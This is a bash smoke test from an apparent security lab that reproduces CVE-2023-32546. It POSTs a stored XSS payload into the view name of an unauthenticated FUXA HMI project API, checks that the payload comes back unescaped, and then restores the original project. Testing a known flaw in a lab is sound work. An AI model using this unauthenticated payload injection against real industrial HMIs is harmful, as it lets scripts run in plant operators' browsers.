#!/usr/bin/env bash
# CVE-2023-32546. FUXA 1.1.7's /api/project accepts arbitrary content in
# view name fields and serves it back to the operator's browser through the
# editor and runtime dashboards without escaping. A visitor who reaches
# :1881 (no auth needed) can stash a script payload in the project; the
# next operator who opens the dashboard runs it under the HMI origin.
#
# GET /api/project returns the hmi.views array, so the stored payload is
# visible to any subsequent caller, not just the browser victim. The payload
# goes into a view name, not server.name, because FUXA's GET endpoint omits
# the server block.
#
# Coverage:
#   Stage 1  :1881 reachable from eng-ws, original project captured
#   Stage 2  POST /api/project with <script> payload in hmi.views[0].name
#   Stage 3  GET /api/project returns the payload byte-for-byte, unescaped
#   Stage 4  restore the original project
#   Stage 5  GET /api/project no longer contains the payload
#
# Usage: bash tests/smoke/test_fuxa_stored_xss.sh
set -uo pipefail

REPO="$(cd "$(dirname "$0")/../.." && pwd)"
source "$REPO/tests/smoke/lib.sh"

ENG_WS="uupl-eng-ws"
FUXA_IP="10.10.3.10"
FUXA_PORT=1881
# Payload kept free of double-quotes so it survives JSON embedding without
# extra escaping. grep -E patterns below match substrings to avoid parens
# being treated as ERE groups.
PAYLOAD='<script>alert(UUPL-XSS-32546)</script>'
POISONED='{"version":"1.00","server":{"id":"0","name":"UUPL Control HMI","type":"FuxaServer","property":{}},"devices":{},"hmi":{"views":[{"id":"xss-32546","name":"<script>alert(UUPL-XSS-32546)<\/script>","items":{}}]}}'
CLEAN='{"version":"1.00","server":{"id":"0","name":"UUPL Control HMI","type":"FuxaServer","property":{}},"devices":{},"hmi":{"views":[]}}'

require_running "$ENG_WS"
require_running "uupl-hmi"

echo "[fuxa-xss] Stage 0: FUXA :$FUXA_PORT reachable, capture original project"
if ! wait_for_port "$ENG_WS" "$FUXA_IP" "$FUXA_PORT" 10; then
    echo "  [skip] FUXA :$FUXA_PORT not reachable; lab needs './ctl down && ./ctl up'."
    exit 2
fi
ORIG="$(in_container "$ENG_WS" curl -s "http://$FUXA_IP:$FUXA_PORT/api/project")"
assert_contains "$ORIG" '"hmi"' "original project pulled"

echo "[fuxa-xss] Stage 2: POST /api/project with <script> payload in hmi.views"
POST_RC="$(in_container "$ENG_WS" curl -s -o /dev/null -w '%{http_code}' \
    -X POST -H 'Content-Type: application/json' \
    -d "$POISONED" \
    "http://$FUXA_IP:$FUXA_PORT/api/project")"
assert_contains "$POST_RC" "200" "POST /api/project accepted (no auth, no CSRF check)"

echo "[fuxa-xss] Stage 3: GET /api/project echoes the payload unescaped"
READBACK="$(in_container "$ENG_WS" curl -s "http://$FUXA_IP:$FUXA_PORT/api/project")"
# Match the opening tag substring only; the closing </script> may appear as
# <\/script> in the JSON encoding, and the parens in alert(...) are ERE
# metacharacters in assert_contains's grep -E call.
assert_contains "$READBACK" 'UUPL-XSS-32546'    "XSS marker present in readback"
assert_contains "$READBACK" '<script>'           "raw script tag stored, not escaped"
assert_absent   "$READBACK" '&lt;script&gt;'    "no HTML-entity encoding applied"

echo "[fuxa-xss] Stage 4: restore the original project"
TMP="/tmp/fuxa_orig_$$.json"
printf '%s' "$ORIG" | docker exec -i "$ENG_WS" sh -c "cat > $TMP"
in_container "$ENG_WS" curl -s -o /dev/null \
    -X POST -H 'Content-Type: application/json' \
    --data-binary "@$TMP" \
    "http://$FUXA_IP:$FUXA_PORT/api/project"
docker exec "$ENG_WS" rm -f "$TMP" >/dev/null 2>&1 || true

echo "[fuxa-xss] Stage 5: project restored"
FINAL="$(in_container "$ENG_WS" curl -s "http://$FUXA_IP:$FUXA_PORT/api/project")"
assert_absent "$FINAL" '<script>' "XSS payload no longer present in project"

summary
